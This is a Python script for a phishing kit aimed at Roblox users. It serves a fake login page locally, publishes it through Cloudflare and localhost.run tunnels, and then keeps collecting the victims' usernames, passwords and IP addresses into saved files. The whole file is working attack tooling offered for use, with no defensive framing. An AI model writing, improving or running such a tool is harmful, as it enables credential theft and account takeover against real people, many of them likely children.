import os
import time
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT

def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = os.path.join("logs", "error.log")

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text) + "\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

cf_file = "logs/cf.log"
lhr_file = "logs/lhr.log"
cf_log = open(cf_file, 'w')
lhr_log = open(lhr_file, 'w')

if os.path.isfile('server/cloudflared'):
    pass
else:
    print('\n\033[31m[!] Cloudflare is not installed.')
    print('\n\033[35m[~] Installing Cloudflare...')
    os.system("bash modules/install.ps1")

def englishmenu():
    if os.name == 'posix':
        os.system("clear")
    elif os.name == 'nt':
        os.system("cls")
    print('\n[~] Starting php server...')
    os.system("php -S localhost:8080 -t pages/roblox_en > /dev/null 2>&1 &")
    time.sleep(2)
    print('[~] PHP server: ✔️')
    print('[~] Creating links...')
    bgtask("/server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
    bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        time.sleep(1)
    for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        time.sleep(1)
    print(f'[~] Link: {cf_url}')
    print(f'[~] Localhost.run: {lhr_url}')
    print('\n[~] Waiting for data...')
    while True:
        if os.path.isfile('pages/roblox_en/usernames.txt'):
            print('\n\033[31m[!] Users found!')
            print('\033[31m')
            os.system("cat pages/roblox_en/usernames.txt")
            os.system("cat pages/roblox_en/usernames.txt >> pages/roblox_en/users_saved.txt")
            os.system("rm -rf pages/roblox_en/usernames.txt")
            print('\n\033[34m[~] Users saved in: users_saved.txt')
        if os.path.isfile('pages/roblox_en/ip.txt'):
            print('\n\033[31m[!] IP found!')
            print('\033[31m')
            os.system("cat pages/roblox_en/ip.txt")
            os.system("cat pages/roblox_en/ip.txt >> pages/roblox_en/ip_saved.txt")
            os.system("rm -rf pages/roblox_en/ip.txt")
            print('\n\033[34m[~] IP saved in: ip_saved.txt')

if __name__ == "__main__":
    englishmenu()
